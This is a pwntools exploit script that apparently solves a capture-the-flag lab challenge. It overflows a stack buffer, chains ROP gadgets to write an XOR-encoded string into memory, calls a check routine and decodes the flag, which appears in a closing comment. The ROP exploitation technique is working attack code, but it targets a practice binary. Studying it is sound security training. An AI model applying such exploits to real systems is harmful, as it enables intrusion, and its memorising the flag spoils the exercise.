from pwn import *

# ./src/lab_rop_rw/share/chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=be62e6ca7a3f2e35411f66bc19a1bb35313c5aa0, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# 0x00000000004020af : pop rdi ; ret
# 0x0000000000485e8b : pop rdx ; pop rbx ; ret
# 0x00000000004337e3 : mov qword ptr [rdi], rdx ; ret
# 0x000000000040101a : ret

context.arch = 'amd64'

pop_rdi = 0x00000000004020af
pop_rdx_rbx = 0x0000000000485e8b
mov_q_prdi_rdx = 0x00000000004337e3
ret = 0x000000000040101a

bss = 0x4c7000
check = 0x4017b5

# p = process('./src/lab_rop_rw/share/chal')
p = remote('10.113.184.121', 10051)

# gdbscript = 'gef\ngef\n'
# gdbscript += 'set follow-fork-mode child\n'

# _pid = gdb.attach(
#     p,
#     gdbscript=gdbscript,
# )

p.recvuntil(b'secret = ')
secret = p.recvline().strip()

print(f"{secret = }")
secret = int(secret, 16)

print(f"{hex(secret) = }")

p.recvuntil(b'> ')

magic = b"kyoumokawaii".ljust(0x10, b'\x00')

_len = len(magic) // 8
val_list = [u64(magic[i * 0x8:(i + 1) * 0x8]) ^ secret for i in range(_len)]

rop_chain = flat([
    #
    pop_rdi,
    bss,
    pop_rdx_rbx,
    val_list[0],
    0,
    mov_q_prdi_rdx,
    #
    pop_rdi,
    bss + 0x8,
    pop_rdx_rbx,
    val_list[1],
    0,
    mov_q_prdi_rdx,
    #
    pop_rdi,
    bss,
    ret,  # stack alignment
    check,
])

payload = b'a' * 0x28 + rop_chain

print(f"{payload = }")
p.sendline(payload)

p.recvuntil(b'flag = ')
xor_flag = p.recvline().strip()[:0x10]

flag = b''
for i in range(_len):
    flag += p64(u64(xor_flag[i * 0x8:(i + 1) * 0x8]) ^ val_list[i])

print(f"{flag = }")

# flag{ShUsHuSHU}
